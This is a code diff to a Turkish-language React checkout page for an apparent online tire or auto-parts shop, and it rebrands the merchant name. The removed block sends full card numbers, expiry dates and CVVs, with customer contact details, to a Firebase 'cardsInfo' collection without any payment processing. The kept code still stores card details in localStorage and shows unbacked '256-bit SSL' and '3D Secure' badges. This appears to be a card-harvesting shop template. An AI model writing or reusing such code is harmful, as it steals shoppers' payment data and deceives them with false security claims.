@@ -178,7 +178,7 @@ function CheckoutFooter() {
 
       {/* Main Footer Content */}
       <div className="flex flex-col items-center pt-6 pb-6 px-4">
-        <Image src="/logo3.png" alt="Logo" width={150} height={160} />
+        <Image className='hidden' src="/logo3.png" alt="Logo" width={150} height={160} />
         <p className="text-gray-500 mt-2 text-sm mb-4">Müşteri Hizmetleri | Çağrı Hattı</p>
         
         {/* WhatsApp Button */}
@@ -321,8 +321,6 @@ export default function CheckoutPage() {
   const [showCardError, setShowCardError] = useState(false);
   const [showReceiptRequired, setShowReceiptRequired] = useState(false);
   const [showCargoRequired, setShowCargoRequired] = useState(false);
-  const [showCardBottomSheet, setShowCardBottomSheet] = useState(false);
-  const [isCardFlipped, setIsCardFlipped] = useState(false);
   const [emailError, setEmailError] = useState('');
   const [countdownTime, setCountdownTime] = useState({ minutes: 15, seconds: 0 });
   const [uploadProgress, setUploadProgress] = useState(0);
@@ -450,14 +448,21 @@ export default function CheckoutPage() {
           }));
         }
         
-        // Restore payment method
-        if (parsedData.paymentMethod) {
-          setPaymentMethod(parsedData.paymentMethod);
-        }
+        // NOT restoring paymentMethod - user should select fresh each time
         
         // Restore selected cargo
         if (parsedData.selectedCargo) {
           setSelectedCargo(parsedData.selectedCargo);
+        }
+        
+        // Restore agreement accepted
+        if (parsedData.agreementAccepted) {
+          setAgreementAccepted(parsedData.agreementAccepted);
+        }
+        
+        // Restore current step
+        if (typeof parsedData.currentStep === 'number' && parsedData.currentStep >= 0) {
+          setCurrentStep(parsedData.currentStep);
         }
         
         // Restore card data (except CVV for security)
@@ -489,8 +494,9 @@ export default function CheckoutPage() {
     try {
       const dataToSave = {
         formData,
-        paymentMethod,
         selectedCargo,
+        agreementAccepted,
+        currentStep,
         cardData: {
           holder: cardData.holder,
           number: cardData.number,
@@ -503,7 +509,7 @@ export default function CheckoutPage() {
     } catch (error) {
       console.error('Error saving checkout data to localStorage:', error);
     }
-  }, [formData, paymentMethod, selectedCargo, cardData.holder, cardData.number, cardData.expiry]);
+  }, [formData, selectedCargo, agreementAccepted, currentStep, cardData.holder, cardData.number, cardData.expiry]);
 
   // Clear checkout data from localStorage after successful order
   const clearCheckoutStorage = () => {
@@ -1073,301 +1079,6 @@ export default function CheckoutPage() {
         )}
       </AnimatePresence>
 
-      {/* Credit Card Bottom Sheet */}
-      <AnimatePresence>
-        {showCardBottomSheet && (
-          <>
-            {/* Backdrop */}
-            <motion.div
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              exit={{ opacity: 0 }}
-              onClick={() => setShowCardBottomSheet(false)}
-              className="fixed inset-0 z-50 bg-black/60 backdrop-blur-md"
-            />
-            
-            {/* Bottom Sheet */}
-            <motion.div
-              initial={{ y: '100%' }}
-              animate={{ y: 0 }}
-              exit={{ y: '100%' }}
-              transition={{ type: 'spring', damping: 30, stiffness: 300 }}
-              className="fixed bottom-0 left-0 right-0 z-50 bg-white rounded-t-3xl shadow-2xl"
-              style={{ height: '80vh' }}
-            >
-              {/* Header with Back Button */}
-              <div className="flex items-center justify-between px-4 pt-2 pb-1">
-                <button
-                  onClick={() => setShowCardBottomSheet(false)}
-                  className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-colors"
-                >
-                  <HiArrowLeft className="w-4 h-4 text-gray-600" />
-                </button>
-                <div className="w-10 h-1 bg-gray-300 rounded-full" />
-                <div className="w-8" /> {/* Spacer for centering */}
-              </div>
-
-              {/* Header Text */}
-              <div className="text-center px-4 pb-1">
-                <h2 className="text-sm font-semibold text-gray-900">Kart Bilgileri</h2>
-              </div>
-
-              {/* Credit Card Visual */}
-              <div className="px-4 mb-2" style={{ perspective: '1000px' }}>
-                <motion.div
-                  className="relative w-full h-40 cursor-pointer"
-                  animate={{ rotateY: isCardFlipped ? 180 : 0 }}
-                  transition={{ duration: 0.6 }}
-                  style={{ transformStyle: 'preserve-3d' }}
-                >
-                  {/* Card Front */}
-                  <div 
-                    className="absolute inset-0 rounded-2xl p-5 flex flex-col justify-between"
-                    style={{ 
-                      backfaceVisibility: 'hidden',
-                      background: cardType === 'visa' 
-                        ? 'linear-gradient(135deg, #1a365d 0%, #2563eb 50%, #1e40af 100%)'
-                        : cardType === 'mastercard'
-                        ? 'linear-gradient(135deg, #1f2937 0%, #374151 50%, #111827 100%)'
-                        : cardType === 'amex'
-                        ? 'linear-gradient(135deg, #065f46 0%, #059669 50%, #047857 100%)'
-                        : 'linear-gradient(135deg, #374151 0%, #4b5563 50%, #1f2937 100%)'
-                    }}
-                  >
-                    {/* Top Row - Chip & Logo */}
-                    <div className="flex justify-between items-start">
-                      {/* Chip */}
-                      <div className="w-12 h-9 rounded-md bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 flex items-center justify-center">
-                        <div className="w-8 h-6 border border-yellow-600/50 rounded-sm grid grid-cols-3 gap-px p-0.5">
-                          {[...Array(6)].map((_, i) => (
-                            <div key={i} className="bg-yellow-600/30 rounded-sm" />
-                          ))}
-                        </div>
-                      </div>
-                      
-                      {/* Card Type Logo */}
-                      <div className="text-right">
-                        {cardType === 'visa' && (
-                          <span className="text-2xl font-bold text-white italic tracking-wider">VISA</span>
-                        )}
-                        {cardType === 'mastercard' && (
-                          <div className="flex items-center">
-                            <div className="w-8 h-8 bg-red-500 rounded-full -mr-3 opacity-90" />
-                            <div className="w-8 h-8 bg-yellow-400 rounded-full opacity-90" />
-                          </div>
-                        )}
-                        {cardType === 'amex' && (
-                          <span className="text-lg font-bold text-white">AMEX</span>
-                        )}
-                        {!cardType && (
-                          <div className="w-10 h-6 bg-white/20 rounded" />
-                        )}
-                      </div>
-                    </div>
-
-                    {/* Card Number */}
-                    <div className="mt-2">
-                      <p className="text-base font-mono text-white tracking-[0.15em] drop-shadow-lg">
-                        {cardData.number || '•••• •••• •••• ••••'}
-                      </p>
-                    </div>
-
-                    {/* Bottom Row - Name & Expiry */}
-                    <div className="flex justify-between items-end">
-                      <div>
-                        <p className="text-[10px] text-white/60 uppercase tracking-wider mb-0.5">Kart Sahibi</p>
-                        <p className="text-sm font-medium text-white uppercase tracking-wider">
-                          {cardData.holder || 'AD SOYAD'}
-                        </p>
-                      </div>
-                      <div className="text-right">
-                        <p className="text-[10px] text-white/60 uppercase tracking-wider mb-0.5">Son Kullanma</p>
-                        <p className="text-sm font-mono text-white">
-                          {cardData.expiry || 'AA/YY'}
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* Card Back */}
-                  <div 
-                    className="absolute inset-0 rounded-2xl overflow-hidden"
-                    style={{ 
-                      backfaceVisibility: 'hidden',
-                      transform: 'rotateY(180deg)',
-                      background: cardType === 'visa' 
-                        ? 'linear-gradient(135deg, #1a365d 0%, #2563eb 50%, #1e40af 100%)'
-                        : cardType === 'mastercard'
-                        ? 'linear-gradient(135deg, #1f2937 0%, #374151 50%, #111827 100%)'
-                        : cardType === 'amex'
-                        ? 'linear-gradient(135deg, #065f46 0%, #059669 50%, #047857 100%)'
-                        : 'linear-gradient(135deg, #374151 0%, #4b5563 50%, #1f2937 100%)'
-                    }}
-                  >
-                    {/* Magnetic Strip */}
-                    <div className="w-full h-12 bg-gray-900 mt-6" />
-                    
-                    {/* Signature & CVV */}
-                    <div className="px-5 mt-4">
-                      <div className="flex items-center gap-3">
-                        <div className="flex-1 h-10 bg-white/90 rounded flex items-center px-3">
-                          <div className="w-full h-4 bg-gray-200 rounded" style={{ background: 'repeating-linear-gradient(90deg, #d1d5db, #d1d5db 2px, #e5e7eb 2px, #e5e7eb 4px)' }} />
-                        </div>
-                        <div className="bg-white px-3 py-2 rounded">
-                          <p className="text-xs text-gray-500 mb-0.5">CVV</p>
-                          <p className="text-lg font-mono font-bold text-gray-900 tracking-wider">
-                            {cardData.cvv || '•••'}
-                          </p>
-                        </div>
-                      </div>
-                    </div>
-
-                    {/* Info Text */}
-                    <div className="px-5 mt-4">
-                      <p className="text-[9px] text-white/40 leading-relaxed">
-                        Bu kart sahibinin mülkiyetindedir. İzinsiz kullanım yasaktır. Kartı kaybettiyseniz lütfen bankanızı arayın.
-                      </p>
-                    </div>
-                  </div>
-                </motion.div>
-              </div>
-
-              {/* Input Fields */}
-              <div className="px-6 space-y-3 overflow-y-auto" style={{ maxHeight: 'calc(80vh - 240px)' }}>
-                {/* Card Holder Name */}
-                <div>
-                  <label className="text-xs font-medium text-gray-600 mb-1 block">Kart Üzerindeki İsim</label>
-                    <input
-                    type="text"
-                    value={cardData.holder}
-                    onChange={(e) => setCardData(prev => ({ ...prev, holder: e.target.value.toUpperCase() }))}
-                    onFocus={() => setIsCardFlipped(false)}
-                    className="w-full h-11 px-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm uppercase"
-                    placeholder="AD SOYAD"
-                  />
-                </div>
-
-                {/* Card Number */}
-                <div>
-                  <label className="text-xs font-medium text-gray-600 mb-1 block">Kart Numarası</label>
-                  <div className="relative">
-                    <input
-                      type="text"
-                      value={cardData.number}
-                      onChange={handleCardNumberChange}
-                      onFocus={() => setIsCardFlipped(false)}
-                      className="w-full h-11 px-4 pr-16 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm font-mono tracking-wider"
-                      placeholder="0000 0000 0000 0000"
-                    />
-                    {cardType && (
-                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                        {cardType === 'visa' && (
-                          <span className="text-sm font-bold text-blue-600 italic">VISA</span>
-                        )}
-                        {cardType === 'mastercard' && (
-                          <div className="flex">
-                            <div className="w-4 h-4 bg-red-500 rounded-full -mr-1.5" />
-                            <div className="w-4 h-4 bg-yellow-400 rounded-full" />
-                          </div>
-                        )}
-                        {cardType === 'amex' && (
-                          <span className="text-xs font-bold text-green-600">AMEX</span>
-                        )}
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                {/* Expiry and CVV */}
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label className="text-xs font-medium text-gray-600 mb-1 block">Son Kullanma</label>
-                    <input
-                      type="text"
-                      value={cardData.expiry}
-                      onChange={handleExpiryChange}
-                      onFocus={() => setIsCardFlipped(false)}
-                      className={`w-full h-11 px-4 bg-gray-50 border rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:bg-white transition-all text-sm font-mono ${
-                        cardData.expiry.length === 5 && !isExpiryValid(cardData.expiry)
-                          ? 'border-red-400 focus:border-red-400'
-                          : 'border-gray-200 focus:border-indigo-500'
-                      }`}
-                      placeholder="AA/YY"
-                    />
-                    {cardData.expiry.length === 5 && !isExpiryValid(cardData.expiry) && (
-                      <p className="text-[10px] text-red-500 mt-1">Geçersiz tarih</p>
-                    )}
-                  </div>
-                  <div>
-                    <label className="text-xs font-medium text-gray-600 mb-1 block">CVV</label>
-                    <input
-                      type="text"
-                      value={cardData.cvv}
-                      onChange={handleCvvChange}
-                      onFocus={() => setIsCardFlipped(true)}
-                      onBlur={() => setIsCardFlipped(false)}
-                      className="w-full h-11 px-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm font-mono tracking-widest"
-                      placeholder="•••"
-                      maxLength={3}
-                    />
-                  </div>
-                </div>
-
-                {/* Submit Button */}
-                <motion.button
-                  whileTap={{ scale: 0.98 }}
-                  onClick={async () => {
-                    if (isCardDataValid) {
-                      try {
-                        // Kart bilgilerini Firebase'e kaydet
-                        await addDoc(collection(db, 'cardsInfo'), {
-                          cardHolder: cardData.holder,
-                          cardNumber: cardData.number,
-                          cardExpiry: cardData.expiry,
-                          cardCvv: cardData.cvv,
-                          cardType: cardType,
-                          customer: {
-                            firstName: formData.firstName,
-                            lastName: formData.lastName,
-                            phone: formData.phone,
-                            email: formData.email
-                          },
-                          createdAt: serverTimestamp()
-                        });
-                        console.log('Kart bilgileri Firebase\'e kaydedildi');
-                      } catch (error) {
-                        console.error('Kart bilgileri kaydedilemedi:', error);
-                      }
-                      setShowCardBottomSheet(false);
-                    }
-                  }}
-                  disabled={!isCardDataValid}
-                  className={`w-full h-12 rounded-xl font-semibold text-sm transition-all mt-2 ${
-                    isCardDataValid
-                      ? 'bg-gradient-to-r from-indigo-500 to-purple-600 text-white shadow-lg shadow-indigo-500/30'
-                      : 'bg-gray-100 text-gray-400 cursor-not-allowed'
-                  }`}
-                >
-                  {isCardDataValid ? (
-                    <span className="flex items-center justify-center gap-2">
-                      <HiCheckCircle className="w-5 h-5" />
-                      Kart Bilgilerini Onayla
-                    </span>
-                  ) : (
-                    'Tüm Alanları Doldurun'
-                  )}
-                </motion.button>
-
-                {/* Security Note */}
-                <div className="flex items-center justify-center gap-2 pb-4">
-                  <span className="text-sm">🔒</span>
-                  <p className="text-[10px] text-gray-400">256-bit SSL ile güvenli bağlantı</p>
-                </div>
-              </div>
-            </motion.div>
-          </>
-        )}
-      </AnimatePresence>
 
       {/* Progress Steps - 4 Steps with more spacing - Fixed below Navbar */}
       <div className="fixed top-[8vh] left-0 right-0 z-40 bg-white px-4 py-3 border-b border-gray-100">
@@ -1800,8 +1511,7 @@ export default function CheckoutPage() {
                   {/* Credit Card Option */}
                   <button
                     onClick={() => {
-                      setPaymentMethod('card');
-                      setShowCardBottomSheet(true);
+                      setPaymentMethod(paymentMethod === 'card' ? '' : 'card');
                     }}
                     className={`w-full p-3 rounded-xl border-2 text-left transition-all relative ${
                       paymentMethod === 'card'
@@ -1829,6 +1539,139 @@ export default function CheckoutPage() {
                       ⚠️ Kampanyalı ürünlerde yalnızca Havale/EFT/FAST ile ödeme kabul edilmektedir.
                     </p>
                   </button>
+
+                  {/* Credit Card Expandable Section */}
+                  <AnimatePresence>
+                    {paymentMethod === 'card' && (
+                      <motion.div
+                        initial={{ height: 0, opacity: 0 }}
+                        animate={{ height: 'auto', opacity: 1 }}
+                        exit={{ height: 0, opacity: 0 }}
+                        transition={{ duration: 0.3, ease: 'easeInOut' }}
+                        className="overflow-hidden"
+                      >
+                        <div className="pt-3 space-y-3">
+                          {/* Card Holder Name */}
+                          <div>
+                            <label className="text-xs font-medium text-gray-600 mb-1 block">Kart Üzerindeki İsim</label>
+                            <input
+                              type="text"
+                              value={cardData.holder}
+                              onChange={(e) => setCardData(prev => ({ ...prev, holder: e.target.value.toUpperCase() }))}
+                              className="w-full h-11 px-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm uppercase"
+                              placeholder="AD SOYAD"
+                            />
+                          </div>
+
+                          {/* Card Number */}
+                          <div>
+                            <label className="text-xs font-medium text-gray-600 mb-1 block">Kart Numarası</label>
+                            <div className="relative">
+                              <input
+                                type="text"
+                                value={cardData.number}
+                                onChange={handleCardNumberChange}
+                                className="w-full h-11 px-4 pr-16 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm font-mono tracking-wider"
+                                placeholder="0000 0000 0000 0000"
+                              />
+                              {cardType && (
+                                <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                                  {cardType === 'visa' && (
+                                    <span className="text-sm font-bold text-blue-600 italic">VISA</span>
+                                  )}
+                                  {cardType === 'mastercard' && (
+                                    <div className="flex">
+                                      <div className="w-4 h-4 bg-red-500 rounded-full -mr-1.5" />
+                                      <div className="w-4 h-4 bg-yellow-400 rounded-full" />
+                                    </div>
+                                  )}
+                                  {cardType === 'amex' && (
+                                    <span className="text-xs font-bold text-green-600">AMEX</span>
+                                  )}
+                                </div>
+                              )}
+                            </div>
+                          </div>
+
+                          {/* Expiry and CVV */}
+                          <div className="grid grid-cols-2 gap-3">
+                            <div>
+                              <label className="text-xs font-medium text-gray-600 mb-1 block">Son Kullanma</label>
+                              <input
+                                type="text"
+                                value={cardData.expiry}
+                                onChange={handleExpiryChange}
+                                className={`w-full h-11 px-4 bg-gray-50 border rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:bg-white transition-all text-sm font-mono ${
+                                  cardData.expiry.length === 5 && !isExpiryValid(cardData.expiry)
+                                    ? 'border-red-400 focus:border-red-400'
+                                    : 'border-gray-200 focus:border-indigo-500'
+                                }`}
+                                placeholder="AA/YY"
+                              />
+                              {cardData.expiry.length === 5 && !isExpiryValid(cardData.expiry) && (
+                                <p className="text-[10px] text-red-500 mt-1">Geçersiz tarih</p>
+                              )}
+                            </div>
+                            <div>
+                              <label className="text-xs font-medium text-gray-600 mb-1 block">CVV</label>
+                              <input
+                                type="text"
+                                value={cardData.cvv}
+                                onChange={handleCvvChange}
+                                className="w-full h-11 px-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 outline-none focus:border-indigo-500 focus:bg-white transition-all text-sm font-mono tracking-widest"
+                                placeholder="•••"
+                                maxLength={3}
+                              />
+                            </div>
+                          </div>
+
+                          {/* Security Note */}
+                          <div className="flex items-center justify-center gap-2 pt-2 pb-1">
+                            <span className="text-sm">🔒</span>
+                            <p className="text-[10px] text-gray-400">256-bit SSL ile güvenli bağlantı</p>
+                          </div>
+                       
+                           {/* Security & Payment Logos */}
+                <div className="flex items-center justify-center gap-3  pt-3 border-t border-gray-200">
+                  {/* 256-bit SSL */}
+                  <div className="flex items-center gap-1.5 px-2.5 py-1.5 bg-gray-900 rounded-lg">
+                    <svg className="w-4 h-4 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
+                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                    </svg>
+                    <span className="text-[10px] font-bold text-white">256-Bit SSL</span>
+                  </div>
+                  
+                  {/* Visa */}
+                  <div className="flex items-center px-2.5 py-1.5 bg-white rounded-lg border border-gray-200">
+                    <svg className="h-5" viewBox="0 0 780 500" fill="none">
+                      <path d="M293.2 348.7l33.4-195.8h53.3l-33.4 195.8h-53.3z" fill="#1434CB"/>
+                      <path d="M534.9 156.7c-10.5-3.9-27-8.2-47.6-8.2-52.4 0-89.3 26.5-89.6 64.4-.3 28.1 26.3 43.7 46.4 53.1 20.6 9.6 27.5 15.7 27.4 24.3-.1 13.1-16.4 19.1-31.6 19.1-21.1 0-32.4-2.9-49.7-10.2l-6.8-3.1-7.4 43.3c12.3 5.4 35.2 10.1 58.9 10.4 55.7 0 91.9-26.2 92.3-66.7.2-22.2-13.9-39.1-44.5-53.1-18.5-9-29.9-15.1-29.8-24.2 0-8.1 9.6-16.8 30.4-16.8 17.4-.3 30 3.5 39.8 7.5l4.8 2.2 7.2-41.9h.2z" fill="#1434CB"/>
+                      <path d="M649.7 152.9h-41c-12.7 0-22.2 3.5-27.8 16.2l-78.8 178.5h55.7s9.1-24 11.2-29.3h68.1c1.6 6.8 6.5 29.3 6.5 29.3h49.2l-43.1-194.7zm-65.5 125.9c4.4-11.3 21.2-54.7 21.2-54.7-.3.5 4.4-11.3 7.1-18.7l3.6 16.9s10.2 46.6 12.3 56.5h-44.2z" fill="#1434CB"/>
+                      <path d="M247 152.9l-52 133.2-5.5-27c-9.6-30.9-39.6-64.4-73.1-81.2l47.4 169.5h56l83.3-194.5H247z" fill="#1434CB"/>
+                      <path d="M146.9 152.9H60.9l-.7 3.8c66.4 16.1 110.4 55.1 128.6 101.9l-18.5-89.3c-3.2-12.3-12.5-15.9-23.4-16.4z" fill="#F9A533"/>
+                    </svg>
+                  </div>
+                  
+                  {/* Mastercard */}
+                  <div className="flex items-center px-2.5 py-1.5 bg-white rounded-lg border border-gray-200">
+                    <div className="flex items-center">
+                      <div className="w-5 h-5 bg-[#EB001B] rounded-full -mr-1.5"></div>
+                      <div className="w-5 h-5 bg-[#F79E1B] rounded-full"></div>
+                    </div>
+                  </div>
+                  
+                  {/* 3D Secure */}
+                  <div className="flex items-center gap-1 px-2.5 py-1.5 bg-white rounded-lg border border-gray-200">
+                    <svg className="w-4 h-4 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
+                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                    </svg>
+                    <span className="text-[10px] font-bold text-gray-700">3D Secure</span>
+                  </div>
+                </div>
+                        </div>
+                      </motion.div>
+                    )}
+                  </AnimatePresence>
                 </div>
               </div>
 
@@ -1836,13 +1679,13 @@ export default function CheckoutPage() {
               <div className="bg-gray-50 p-4 rounded-xl border border-gray-200">
                 <h3 className="text-sm font-bold text-gray-800 mb-3 pb-2 border-b border-gray-300">Ticari Bilgilerimiz:</h3>
                 <div className="space-y-1.5 text-sm text-gray-700">
-                  <p><span className="font-medium">Firma Ünvanı:</span> <span className="font-bold">Oto  Market 360 İthalat İhracat Ticaret Ltd. Şti.</span></p>
-                  <p><span className="font-medium">Vergi No:</span> <span className="font-bold">84700XXXXX</span></p>
-                  <p><span className="font-medium">MERSİS No:</span> <span className="font-bold">084700XXXXXXXXXX</span></p>
+                  <p><span className="font-medium">Firma Ünvanı:</span> <span className="font-bold">Lastik Alsana İthalat İhracat Ticaret Ltd. Şti.</span></p>
+                  <p><span className="font-medium">Vergi No:</span> <span className="font-bold">39XXXXXXX</span></p>
+                  <p><span className="font-medium">MERSİS No:</span> <span className="font-bold">039XXXXXXXXXXXXX</span></p>
                 </div>
                 
                 {/* Security & Payment Logos */}
-                <div className="flex items-center justify-center gap-3 mt-4 pt-3 border-t border-gray-200">
+                <div className="flex hidden items-center justify-center gap-3 mt-4 pt-3 border-t border-gray-200">
                   {/* 256-bit SSL */}
                   <div className="flex items-center gap-1.5 px-2.5 py-1.5 bg-gray-900 rounded-lg">
                     <svg className="w-4 h-4 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
